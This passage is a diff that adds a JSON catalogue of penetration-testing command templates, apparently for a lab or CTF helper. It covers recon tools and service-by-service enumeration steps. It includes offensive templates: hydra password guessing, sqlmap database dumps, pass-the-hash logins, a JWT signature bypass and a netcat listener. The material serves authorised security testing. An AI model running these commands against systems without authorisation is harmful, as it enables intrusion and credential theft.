@@ -1,0 +1,636 @@
+{
+  "tools": [
+    { "name": "nmap", "description": "Port scanner and service detector with a script engine (NSE).", "commands": [
+      { "purpose": "Quick scan of the top 1000 TCP ports", "template": "nmap -T4 {{TARGET}}", "intent": "discover" },
+      { "purpose": "Full TCP sweep of all 65535 ports", "template": "nmap -p- --min-rate 5000 -T4 -oA nmap/full {{TARGET}}", "intent": "discover" },
+      { "purpose": "UDP scan of the top 100 ports (slow, needs root)", "template": "sudo nmap -sU --top-ports 100 -oA nmap/udp {{TARGET}}", "intent": "discover" },
+      { "purpose": "Versions and default scripts on the ports you found", "template": "nmap -sC -sV -p <ports> -oA nmap/services {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Run the vuln script category against found ports", "template": "nmap --script vuln -p <ports> -oA nmap/vuln {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Skip host discovery when ping is blocked (Windows boxes)", "template": "nmap -Pn -sC -sV {{TARGET}}", "intent": "tune" },
+      { "purpose": "Pull the open ports out of a greppable scan as a comma list", "template": "grep -oP '\\d+/open' nmap/full.gnmap | cut -d/ -f1 | paste -sd,", "intent": "tune" }
+    ]},
+    { "name": "autorecon", "description": "Multi-threaded recon that runs nmap, then service-specific tools on every port it finds.", "commands": [
+      { "purpose": "Full automated recon; results land in ./results/{{TARGET}}", "template": "sudo autorecon {{TARGET}}", "intent": "discover" },
+      { "purpose": "Single target, results straight into the current folder", "template": "sudo autorecon {{TARGET}} --single-target -o .", "intent": "discover" }
+    ]},
+    { "name": "rustscan", "description": "Very fast port finder that hands open ports to nmap.", "commands": [
+      { "purpose": "Find all open ports, then run nmap scripts and versions on them", "template": "rustscan -a {{TARGET}} --ulimit 5000 -- -sC -sV -oA nmap/rustscan", "intent": "discover" },
+      { "purpose": "Only list open ports (greppable)", "template": "rustscan -a {{TARGET}} --ulimit 5000 -g", "intent": "discover" }
+    ]},
+    { "name": "nc", "description": "Netcat: raw TCP/UDP connections, banner grabs and listeners.", "commands": [
+      { "purpose": "Connect to a port and read its banner", "template": "nc -nv {{TARGET}} <port>", "intent": "enumerate" },
+      { "purpose": "Check whether a range of ports is open", "template": "nc -nvz -w 1 {{TARGET}} 1-1000", "intent": "discover" },
+      { "purpose": "Listen for an incoming connection", "template": "nc -lvnp {{LPORT}}", "intent": "" }
+    ]},
+    { "name": "curl", "description": "Command-line HTTP client for raw requests.", "commands": [
+      { "purpose": "Fetch a page and show response headers", "template": "curl -i http://{{DNS}}/", "intent": "enumerate" },
+      { "purpose": "Headers only, ignore bad TLS certs", "template": "curl -skI https://{{DNS}}/", "intent": "enumerate" },
+      { "purpose": "Follow redirects and show where you land", "template": "curl -sL -o /dev/null -w '%{url_effective}\\n' http://{{TARGET}}/", "intent": "enumerate" },
+      { "purpose": "Send a POST form with a session cookie", "template": "curl -s -X POST -b 'session=<cookie>' -d 'param=value' http://{{DNS}}/<page>", "intent": "" },
+      { "purpose": "Route a request through Burp to inspect or replay it", "template": "curl -s -x http://127.0.0.1:8080 http://{{DNS}}/<page>", "intent": "tune" }
+    ]},
+    { "name": "dig", "description": "DNS lookup tool.", "commands": [
+      { "purpose": "Attempt a zone transfer from the target's DNS server", "template": "dig axfr {{DNS}} @{{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Ask for all record types for the domain", "template": "dig any {{DNS}} @{{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Reverse lookup: find the hostname of the IP", "template": "dig -x {{TARGET}} @{{TARGET}}", "intent": "enumerate" },
+      { "purpose": "List the domain's name servers", "template": "dig ns {{DNS}} @{{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "smbclient", "description": "FTP-like client for SMB shares.", "commands": [
+      { "purpose": "List shares with a null session", "template": "smbclient -L //{{TARGET}}/ -N", "intent": "enumerate" },
+      { "purpose": "Connect to a share anonymously", "template": "smbclient //{{TARGET}}/<share> -N", "intent": "enumerate" },
+      { "purpose": "Connect to a share with credentials", "template": "smbclient //{{TARGET}}/<share> -U '<user>%<pass>'", "intent": "authenticate" },
+      { "purpose": "Download a whole share recursively", "template": "smbclient //{{TARGET}}/<share> -N -c 'recurse ON; prompt OFF; mget *'", "intent": "dump" }
+    ]},
+    { "name": "smbmap", "description": "Lists SMB shares with read/write permissions.", "commands": [
+      { "purpose": "Shares and permissions with a null session", "template": "smbmap -H {{TARGET}} -u '' -p ''", "intent": "enumerate" },
+      { "purpose": "Shares and permissions as the guest account", "template": "smbmap -H {{TARGET}} -u guest -p ''", "intent": "enumerate" },
+      { "purpose": "Recursively list a share's contents with credentials", "template": "smbmap -H {{TARGET}} -u '<user>' -p '<pass>' -r '<share>'", "intent": "enumerate" },
+      { "purpose": "Download one file from a share", "template": "smbmap -H {{TARGET}} -u '<user>' -p '<pass>' --download '<share>/<file>'", "intent": "dump" }
+    ]},
+    { "name": "enum4linux-ng", "description": "All-in-one SMB/RPC enumeration (users, groups, shares, policy, OS).", "commands": [
+      { "purpose": "Run every check with a null session", "template": "enum4linux-ng -A {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Run every check with credentials", "template": "enum4linux-ng -A -u '<user>' -p '<pass>' {{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "netexec", "description": "NetExec (nxc): checks credentials and enumerates SMB, WinRM, LDAP, MSSQL, RDP and more.", "commands": [
+      { "purpose": "Host info: OS, hostname, domain, SMB signing", "template": "nxc smb {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "List shares with a null session", "template": "nxc smb {{TARGET}} -u '' -p '' --shares", "intent": "enumerate" },
+      { "purpose": "List shares as guest", "template": "nxc smb {{TARGET}} -u guest -p '' --shares", "intent": "enumerate" },
+      { "purpose": "List domain or local users", "template": "nxc smb {{TARGET}} -u '<user>' -p '<pass>' --users", "intent": "enumerate" },
+      { "purpose": "Brute-force RIDs to list users (works as guest sometimes)", "template": "nxc smb {{TARGET}} -u guest -p '' --rid-brute", "intent": "enumerate" },
+      { "purpose": "Show the password policy before any guessing", "template": "nxc smb {{TARGET}} -u '<user>' -p '<pass>' --pass-pol", "intent": "enumerate" },
+      { "purpose": "Check whether credentials work over WinRM", "template": "nxc winrm {{TARGET}} -u '<user>' -p '<pass>'", "intent": "authenticate" },
+      { "purpose": "Check whether credentials work over MSSQL", "template": "nxc mssql {{TARGET}} -u '<user>' -p '<pass>'", "intent": "authenticate" }
+    ]},
+    { "name": "rpcclient", "description": "MS-RPC client over SMB named pipes.", "commands": [
+      { "purpose": "List domain users over a null session", "template": "rpcclient -U '' -N {{TARGET}} -c enumdomusers", "intent": "enumerate" },
+      { "purpose": "Show domain and server info", "template": "rpcclient -U '' -N {{TARGET}} -c querydominfo", "intent": "enumerate" },
+      { "purpose": "Open an interactive session with credentials", "template": "rpcclient -U '<user>%<pass>' {{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "snmpwalk", "description": "Walks the SNMP tree to read device data.", "commands": [
+      { "purpose": "Walk everything with the public community (v2c)", "template": "snmpwalk -v2c -c public {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Same with SNMP v1 if v2c gets no answer", "template": "snmpwalk -v1 -c public {{TARGET}}", "intent": "enumerate" },
+      { "purpose": "Running processes and their arguments (look for passwords)", "template": "snmpwalk -v2c -c public {{TARGET}} 1.3.6.1.2.1.25.4.2.1.2", "intent": "enumerate" },
+      { "purpose": "Installed software", "template": "snmpwalk -v2c -c public {{TARGET}} 1.3.6.1.2.1.25.6.3.1.2", "intent": "enumerate" },
+      { "purpose": "Windows local user accounts", "template": "snmpwalk -v2c -c public {{TARGET}} 1.3.6.1.4.1.77.1.2.25", "intent": "enumerate" },
+      { "purpose": "NET-SNMP extend output (custom scripts, often leaks secrets)", "template": "snmpwalk -v2c -c public {{TARGET}} 1.3.6.1.4.1.8072.1.3.2", "intent": "enumerate" }
+    ]},
+    { "name": "onesixtyone", "description": "Fast SNMP community-string guesser.", "commands": [
+      { "purpose": "Guess community strings from the SecLists list", "template": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{TARGET}}", "intent": "discover" }
+    ]},
+    { "name": "ldapsearch", "description": "OpenLDAP query client.", "commands": [
+      { "purpose": "Read the naming contexts (base DN) anonymously", "template": "ldapsearch -x -H ldap://{{TARGET}} -s base namingcontexts", "intent": "enumerate" },
+      { "purpose": "Dump everything readable with an anonymous bind", "template": "ldapsearch -x -H ldap://{{TARGET}} -b '<base_dn>'", "intent": "enumerate" },
+      { "purpose": "List users and their descriptions with credentials", "template": "ldapsearch -x -H ldap://{{TARGET}} -D '<user>@<domain>' -w '<pass>' -b '<base_dn>' '(objectClass=user)' sAMAccountName description", "intent": "enumerate" }
+    ]},
+    { "name": "showmount", "description": "Lists NFS exports.", "commands": [
+      { "purpose": "List exported directories and who may mount them", "template": "showmount -e {{TARGET}}", "intent": "enumerate" }
+    ]},
+    { "name": "mysql", "description": "MySQL/MariaDB command-line client.", "commands": [
+      { "purpose": "Log in remotely (Kali's MariaDB client may need --skip-ssl)", "template": "mysql -h {{TARGET}} -u <user> -p --skip-ssl", "intent": "authenticate" },
+      { "purpose": "Try root with an empty password", "template": "mysql -h {{TARGET}} -u root --skip-ssl", "intent": "authenticate" }
+    ]},
+    { "name": "impacket-mssqlclient", "description": "Impacket MSSQL client with handy built-in commands.", "commands": [
+      { "purpose": "Log in with a SQL account", "template": "impacket-mssqlclient '<user>:<pass>@{{TARGET}}'", "intent": "authenticate" },
+      { "purpose": "Log in with a Windows / domain account", "template": "impacket-mssqlclient '<domain>/<user>:<pass>@{{TARGET}}' -windows-auth", "intent": "authenticate" }
+    ]},
+    { "name": "evil-winrm", "description": "WinRM shell client for Windows.", "commands": [
+      { "purpose": "Open a PowerShell session with a password", "template": "evil-winrm -i {{TARGET}} -u '<user>' -p '<pass>'", "intent": "authenticate" },
+      { "purpose": "Open a session with an NT hash (pass-the-hash)", "template": "evil-winrm -i {{TARGET}} -u '<user>' -H '<hash>'", "intent": "authenticate" }
+    ]},
+    { "name": "redis-cli", "description": "Redis command-line client.", "commands": [
+      { "purpose": "Server info: version, OS, config file, keyspace", "template": "redis-cli -h {{TARGET}} INFO", "intent": "enumerate" },
+      { "purpose": "List keys without blocking the server", "template": "redis-cli -h {{TARGET}} --scan", "intent": "enumerate" },
+      { "purpose": "Read one key's value", "template": "redis-cli -h {{TARGET}} GET <key>", "intent": "dump" },
+      { "purpose": "Authenticate when the server needs a password", "template": "redis-cli -h {{TARGET}} -a '<pass>' INFO", "intent": "authenticate" }
+    ]},
+    { "name": "whatweb", "description": "Identifies web technologies, CMS, frameworks and versions.", "commands": [
+      { "purpose": "Aggressive fingerprint of the site", "template": "whatweb -a 3 http://{{DNS}}", "intent": "enumerate" },
+      { "purpose": "Verbose output with every plugin hit", "template": "whatweb -v http://{{DNS}}", "intent": "enumerate" }
+    ]},
+    { "name": "ffuf", "description": "Fast web fuzzer: directories, vhosts, parameters, values.", "commands": [
+      { "purpose": "Directory discovery", "template": "ffuf -u http://{{DNS}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ic", "intent": "discover" },
+      { "purpose": "File discovery with extensions", "template": "ffuf -u http://{{DNS}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.html -ic", "intent": "discover" },
+      { "purpose": "Virtual host discovery; -ac filters the default response", "template": "ffuf -u http://{{TARGET}} -H 'Host: FUZZ.{{DNS}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac", "intent": "discover" },
+      { "purpose": "Filter out a fixed response size by hand", "template": "ffuf -u http://{{DNS}}/FUZZ -w <wordlist> -fs <size>", "intent": "tune" },
+      { "purpose": "Keep a cookie and slow down with fewer threads", "template": "ffuf -u http://{{DNS}}/FUZZ -w <wordlist> -b 'session=<cookie>' -t 20", "intent": "tune" }
+    ]},
+    { "name": "gobuster", "description": "Directory and vhost brute-forcer.", "commands": [
+      { "purpose": "Directory and file discovery with extensions", "template": "gobuster dir -u http://{{DNS}} -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50", "intent": "discover" },
+      { "purpose": "Same over HTTPS with a self-signed cert", "template": "gobuster dir -u https://{{DNS}} -w /usr/share/wordlists/dirb/common.txt -k", "intent": "discover" },
+      { "purpose": "Virtual host discovery", "template": "gobuster vhost -u http://{{DNS}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain", "intent": "discover" }
+    ]},
+    { "name": "feroxbuster", "description": "Recursive content discovery.", "commands": [
+      { "purpose": "Recursive directory and file discovery", "template": "feroxbuster -u http://{{DNS}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt", "intent": "discover" },
+      { "purpose": "No recursion, ignore bad TLS", "template": "feroxbuster -u https://{{DNS}} -w /usr/share/wordlists/dirb/common.txt -n -k", "intent": "discover" }
+    ]},
+    { "name": "arjun", "description": "Finds hidden HTTP parameters.", "commands": [
+      { "purpose": "Find GET parameters on a page", "template": "arjun -u http://{{DNS}}/<page>", "intent": "discover" },
+      { "purpose": "Find POST parameters on a page", "template": "arjun -u http://{{DNS}}/<page> -m POST", "intent": "discover" }
+    ]},
+    { "name": "nikto", "description": "Web server scanner for misconfigurations and known files.", "commands": [
+      { "purpose": "Scan a web server", "template": "nikto -h http://{{DNS}}", "intent": "enumerate" },
+      { "purpose": "Scan an HTTPS site", "template": "nikto -h https://{{DNS}} -ssl", "intent": "enumerate" }
+    ]},
+    { "name": "wpscan", "description": "WordPress scanner.", "commands": [
+      { "purpose": "Enumerate plugins, themes and users", "template": "wpscan --url http://{{DNS}} -e ap,at,u", "intent": "enumerate" },
+      { "purpose": "Thorough plugin detection with vulnerability data (free API token)", "template": "wpscan --url http://{{DNS}} -e vp,vt,u --plugins-detection aggressive --api-token <token>", "intent": "enumerate" },
+      { "purpose": "Password attack on a found user", "template": "wpscan --url http://{{DNS}} -U <user> -P /usr/share/wordlists/rockyou.txt", "intent": "authenticate" }
+    ]},
+    { "name": "droopescan", "description": "Scanner for Drupal and SilverStripe.", "commands": [
+      { "purpose": "Scan a Drupal site for version, modules and themes", "template": "droopescan scan drupal -u http://{{DNS}}", "intent": "enumerate" }
+    ]},
+    { "name": "joomscan", "description": "OWASP Joomla scanner.", "commands": [
+      { "purpose": "Scan a Joomla site for version, components and config leaks", "template": "joomscan -u http://{{DNS}}", "intent": "enumerate" }
+    ]},
+    { "name": "nuclei", "description": "Template-based scanner for CVEs, misconfigs and default logins.", "commands": [
+      { "purpose": "Update the template library", "template": "nuclei -ut", "intent": "tune" },
+      { "purpose": "Run the default templates against a site", "template": "nuclei -u http://{{DNS}}", "intent": "enumerate" },
+      { "purpose": "Only CVE templates", "template": "nuclei -u http://{{DNS}} -tags cve", "intent": "enumerate" },
+      { "purpose": "Only critical and high findings", "template": "nuclei -u http://{{DNS}} -severity critical,high", "intent": "enumerate" },
+      { "purpose": "Check known default logins", "template": "nuclei -u http://{{DNS}} -tags default-login", "intent": "authenticate" }
+    ]},
+    { "name": "searchsploit", "description": "Offline search of the Exploit-DB archive.", "commands": [
+      { "purpose": "Search by product and version", "template": "searchsploit <product> <version>", "intent": "enumerate" },
+      { "purpose": "Read an exploit without copying it", "template": "searchsploit -x <id>", "intent": "enumerate" },
+      { "purpose": "Copy an exploit into the current folder", "template": "searchsploit -m <id>", "intent": "exploit" },
+      { "purpose": "Search every service found in an nmap XML scan", "template": "searchsploit --nmap nmap/services.xml", "intent": "enumerate" },
+      { "purpose": "Update the local database", "template": "searchsploit -u", "intent": "tune" }
+    ]},
+    { "name": "hydra", "description": "Online password guesser for many protocols.", "commands": [
+      { "purpose": "Unpack rockyou once on a fresh Kali", "template": "sudo gunzip /usr/share/wordlists/rockyou.txt.gz", "intent": "tune" },
+      { "purpose": "Web login form; F= is text shown on a failed login", "template": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt {{TARGET}} http-post-form '/login.php:username=^USER^&password=^PASS^:F=Invalid'", "intent": "authenticate" },
+      { "purpose": "HTTP basic auth on a path", "template": "hydra -L <wordlist> -P <wordlist> {{TARGET}} http-get /admin/", "intent": "authenticate" },
+      { "purpose": "SSH with few threads, stop on first hit", "template": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://{{TARGET}}", "intent": "authenticate" },
+      { "purpose": "FTP login guessing", "template": "hydra -L <wordlist> -P <wordlist> -f ftp://{{TARGET}}", "intent": "authenticate" }
+    ]},
+    { "name": "sqlmap", "description": "Automated SQL injection detection and extraction.", "commands": [
+      { "purpose": "Test a GET parameter", "template": "sqlmap -u 'http://{{DNS}}/<page>?id=1' --batch", "intent": "discover" },
+      { "purpose": "Test a request saved from Burp (POST, cookies, headers)", "template": "sqlmap -r <file> --batch", "intent": "discover" },
+      { "purpose": "Find and test forms on the site", "template": "sqlmap -u 'http://{{DNS}}/' --forms --crawl=2 --batch", "intent": "discover" },
+      { "purpose": "List databases", "template": "sqlmap -r <file> --batch --dbs", "intent": "enumerate" },
+      { "purpose": "List tables in one database", "template": "sqlmap -r <file> --batch -D <db> --tables", "intent": "enumerate" },
+      { "purpose": "Dump one table", "template": "sqlmap -r <file> --batch -D <db> -T <table> --dump", "intent": "dump" },
+      { "purpose": "Try harder when nothing is found", "template": "sqlmap -r <file> --batch --level 5 --risk 3", "intent": "tune" }
+    ]},
+    { "name": "commix", "description": "Automated command injection tester.", "commands": [
+      { "purpose": "Test a GET parameter for command injection", "template": "commix -u 'http://{{DNS}}/<page>?ip=127.0.0.1' --batch", "intent": "discover" },
+      { "purpose": "Test a POST parameter", "template": "commix -u 'http://{{DNS}}/<page>' --data='ip=127.0.0.1' --batch", "intent": "discover" }
+    ]},
+    { "name": "sstimap", "description": "Detects server-side template injection and the engine behind it.", "commands": [
+      { "purpose": "Test the parameters in a URL", "template": "sstimap -u 'http://{{DNS}}/<page>?name=test'", "intent": "discover" }
+    ]},
+    { "name": "jwt_tool", "description": "JWT toolkit (github.com/ticarpi/jwt_tool): decode, tamper, re-sign and test known JWT attacks.", "commands": [
+      { "purpose": "Decode a token and list its claims", "template": "python3 jwt_tool.py '<token>'", "intent": "enumerate" },
+      { "purpose": "Try the alg=none signature bypass", "template": "python3 jwt_tool.py '<token>' -X a", "intent": "exploit" },
+      { "purpose": "Edit claims and re-sign with a cracked HS256 secret", "template": "python3 jwt_tool.py '<token>' -T -S hs256 -p '<secret>'", "intent": "exploit" }
+    ] }
+  ],
+  "techniques": [
+    {
+      "name": "Automated first-pass recon",
+      "phase": "Recon", "service": "any", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "Start here on a fresh IP so scans run in the background while you look around by hand.",
+      "tools": ["autorecon", "rustscan"],
+      "commands": []
+    },
+    {
+      "name": "Port and service scanning",
+      "phase": "Recon", "service": "any", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "Every target: find which ports are open and what software and version runs on each.",
+      "tools": ["nmap", "nc"],
+      "commands": [
+        { "purpose": "Make a folder for scan output first", "template": "mkdir -p nmap", "intent": "tune" }
+      ]
+    },
+    {
+      "name": "FTP enumeration",
+      "phase": "Recon", "service": "ftp", "applies": "any",
+      "needs": [], "yields": ["version", "creds"],
+      "when": "Port 21 is open: check for anonymous login and files you can read or upload.",
+      "tools": ["hydra"],
+      "commands": [
+        { "purpose": "Anonymous login and server type scripts", "template": "nmap -p21 --script ftp-anon,ftp-syst -sV {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Connect by hand; try user anonymous with an empty password", "template": "ftp {{TARGET}}", "intent": "authenticate" },
+        { "purpose": "Mirror everything readable anonymously", "template": "wget -m --no-passive ftp://anonymous:anonymous@{{TARGET}}", "intent": "dump" }
+      ]
+    },
+    {
+      "name": "SSH enumeration",
+      "phase": "Recon", "service": "ssh", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "Port 22 is open: note the version and auth methods, then come back once you have credentials or a key.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Grab the banner (OS and version hints)", "template": "nc -nv {{TARGET}} 22", "intent": "enumerate" },
+        { "purpose": "Which auth methods a user may use (password, key)", "template": "nmap -p22 --script ssh-auth-methods --script-args ssh.user=<user> {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Log in with a found private key", "template": "chmod 600 <file> && ssh -i <file> <user>@{{TARGET}}", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "SMTP user enumeration",
+      "phase": "Recon", "service": "smtp", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "Port 25 is open: the mail server may confirm which usernames exist.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Supported commands, user enum and open relay scripts", "template": "nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Talk to it by hand; then type VRFY root", "template": "nc -nv {{TARGET}} 25", "intent": "enumerate" },
+        { "purpose": "Check a list of usernames with VRFY", "template": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "DNS enumeration",
+      "phase": "Recon", "service": "dns", "applies": "any",
+      "needs": [], "yields": [],
+      "when": "Port 53 is open: try a zone transfer to reveal every hostname the box serves.",
+      "tools": ["dig"],
+      "commands": [
+        { "purpose": "Zone transfer with host instead of dig", "template": "host -l {{DNS}} {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Reverse lookups across the subnet using the target as resolver", "template": "dnsrecon -r <cidr> -n {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Brute-force subdomains against the target's DNS", "template": "dnsrecon -d {{DNS}} -n {{TARGET}} -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "intent": "discover" }
+      ]
+    },
+    {
+      "name": "RPC enumeration",
+      "phase": "Recon", "service": "rpc", "applies": "any",
+      "needs": [], "yields": [],
+      "when": "Port 111 or 135 is open: list registered RPC services and, on Windows, try a null session for users.",
+      "tools": ["rpcclient"],
+      "commands": [
+        { "purpose": "List RPC programs on port 111 (look for nfs and mountd)", "template": "rpcinfo -p {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "List Windows RPC endpoints on port 135", "template": "impacket-rpcdump -port 135 {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Share enumeration",
+      "phase": "Recon", "service": "smb", "applies": "any",
+      "needs": [], "yields": ["creds"],
+      "when": "Port 139 or 445 is open: list shares, see which ones you can read or write, and pull their files.",
+      "tools": ["smbclient", "smbmap", "netexec"],
+      "commands": [
+        { "purpose": "SMB versions, signing and OS scripts", "template": "nmap -p139,445 --script smb-protocols,smb-security-mode,smb2-security-mode,smb-os-discovery {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Check for known SMB vulnerabilities (MS17-010 and friends)", "template": "nmap -p445 --script 'smb-vuln*' {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "SMB user and policy enumeration",
+      "phase": "Recon", "service": "smb", "applies": "windows",
+      "needs": [], "yields": [],
+      "when": "SMB allows null or guest sessions: collect usernames, groups and the password policy before any guessing.",
+      "tools": ["enum4linux-ng", "netexec", "rpcclient"],
+      "commands": []
+    },
+    {
+      "name": "SNMP enumeration",
+      "phase": "Recon", "service": "snmp", "applies": "any",
+      "needs": [], "yields": ["creds"],
+      "when": "UDP 161 is open: guess the community string, then walk the tree for users, processes and software.",
+      "tools": ["onesixtyone", "snmpwalk"],
+      "commands": [
+        { "purpose": "Confirm SNMP and read basic info", "template": "sudo nmap -sU -p161 --script snmp-info,snmp-sysdescr {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Readable summary of everything SNMP exposes", "template": "snmp-check {{TARGET}} -c public", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "LDAP enumeration",
+      "phase": "Recon", "service": "ldap", "applies": "ad",
+      "needs": [], "yields": [],
+      "when": "Port 389 or 636 is open: find the base DN and see what an anonymous bind can read, especially user descriptions.",
+      "tools": ["ldapsearch"],
+      "commands": [
+        { "purpose": "Safe LDAP scripts (root DSE, naming contexts)", "template": "nmap -p389 --script 'ldap* and not brute' {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "LDAPS on 636 when plain LDAP is closed", "template": "ldapsearch -x -H ldaps://{{TARGET}} -s base namingcontexts", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "MySQL access check",
+      "phase": "Recon", "service": "mysql", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "Port 3306 is reachable: check the version, empty root passwords, and any credentials you found elsewhere.",
+      "tools": ["mysql"],
+      "commands": [
+        { "purpose": "Version and empty-password scripts", "template": "nmap -p3306 -sV --script mysql-info,mysql-empty-password {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Once logged in: list databases", "template": "SHOW DATABASES;", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "MSSQL access check",
+      "phase": "Recon", "service": "mssql", "applies": "windows",
+      "needs": [], "yields": ["version"],
+      "when": "Port 1433 is open: read the version and hostname, then try any credentials you have.",
+      "tools": ["impacket-mssqlclient", "netexec"],
+      "commands": [
+        { "purpose": "Version, instance and NTLM host info", "template": "nmap -p1433 -sV --script ms-sql-info,ms-sql-ntlm-info {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Once logged in: list databases", "template": "SELECT name FROM sys.databases;", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "RDP access check",
+      "phase": "Recon", "service": "rdp", "applies": "windows",
+      "needs": [], "yields": [],
+      "when": "Port 3389 is open: read the hostname and domain, and log in once you have credentials.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Hostname, domain and OS build from NTLM info", "template": "nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Check credentials over RDP", "template": "nxc rdp {{TARGET}} -u '<user>' -p '<pass>'", "intent": "authenticate" },
+        { "purpose": "Open a desktop session", "template": "xfreerdp3 /v:{{TARGET}} /u:<user> /p:'<pass>' /cert:ignore /dynamic-resolution", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "WinRM access check",
+      "phase": "Recon", "service": "winrm", "applies": "windows",
+      "needs": [], "yields": [],
+      "when": "Port 5985 or 5986 is open: any working credentials or hash may give you a shell here.",
+      "tools": ["evil-winrm"],
+      "commands": [
+        { "purpose": "Check credentials; (Pwn3d!) means you can get a shell", "template": "nxc winrm {{TARGET}} -u '<user>' -p '<pass>'", "intent": "authenticate" }
+      ]
+    },
+    {
+      "name": "NFS export enumeration",
+      "phase": "Recon", "service": "nfs", "applies": "linux",
+      "needs": [], "yields": ["creds"],
+      "when": "Port 2049 is open: list exported folders, mount them and look for keys, configs and home directories.",
+      "tools": ["showmount"],
+      "commands": [
+        { "purpose": "NFS scripts: exports, file listing, disk stats", "template": "nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Mount an export locally", "template": "sudo mkdir -p /mnt/nfs && sudo mount -t nfs {{TARGET}}:/<share> /mnt/nfs -o nolock", "intent": "enumerate" },
+        { "purpose": "Show file owners as numbers (match their UID to read files)", "template": "ls -lan /mnt/nfs", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Redis enumeration",
+      "phase": "Recon", "service": "redis", "applies": "linux",
+      "needs": [], "yields": ["version"],
+      "when": "Port 6379 is open: Redis often has no password, so read its info and stored keys.",
+      "tools": ["redis-cli"],
+      "commands": [
+        { "purpose": "Version and config via script", "template": "nmap -p6379 --script redis-info {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Unknown port identification",
+      "phase": "Recon", "service": "any", "applies": "any",
+      "needs": [], "yields": ["version"],
+      "when": "nmap shows a port as unknown or tcpwrapped: poke it by hand to learn what it speaks.",
+      "tools": ["nc"],
+      "commands": [
+        { "purpose": "Harder version detection on one port", "template": "nmap -sV --version-intensity 9 -p <port> {{TARGET}}", "intent": "enumerate" },
+        { "purpose": "Try HTTP on it", "template": "curl -i http://{{TARGET}}:<port>/", "intent": "enumerate" },
+        { "purpose": "Try TLS on it and read the certificate", "template": "openssl s_client -connect {{TARGET}}:<port> </dev/null", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Hostname resolution",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": [], "yields": [],
+      "when": "The site redirects to a name or a cert shows a hostname: map {{DNS}} to the IP so the right site loads.",
+      "tools": [],
+      "commands": [
+        { "purpose": "Add the hostname to /etc/hosts", "template": "echo '{{TARGET}} {{DNS}}' | sudo tee -a /etc/hosts", "intent": "tune" },
+        { "purpose": "See which hostname a redirect points to", "template": "curl -sI http://{{TARGET}}/ | grep -i location", "intent": "enumerate" },
+        { "purpose": "Read hostnames from the TLS certificate", "template": "openssl s_client -connect {{TARGET}}:443 </dev/null 2>/dev/null | openssl x509 -noout -ext subjectAltName", "intent": "enumerate" }
+      ]
+    },
+    {
+      "name": "Web fingerprinting",
+      "phase": "Recon", "service": "http", "applies": "any",
+      "needs": [], "yields": ["web app", "version"],
+      "when": "A web port is open: find out what server, framework, CMS and versions the site runs.",
+      "tools": ["whatweb", "curl"],
+      "commands": [
+        { "purpose": "Paths the owner wants hidden", "template": "curl -s http://{{DNS}}/robots.txt", "intent": "enumerate" },
+        { "purpose": "Every page the site lists", "template": "curl -s http://{{DNS}}/sitemap.xml", "intent": "enumerate" },
+        { "purpose": "Title, headers and common paths via nmap", "template": "nmap -p80,443 --script http-title,http-headers,http-enum {{TARGET}}", "intent": "enumerate" }
+      ]
+    },
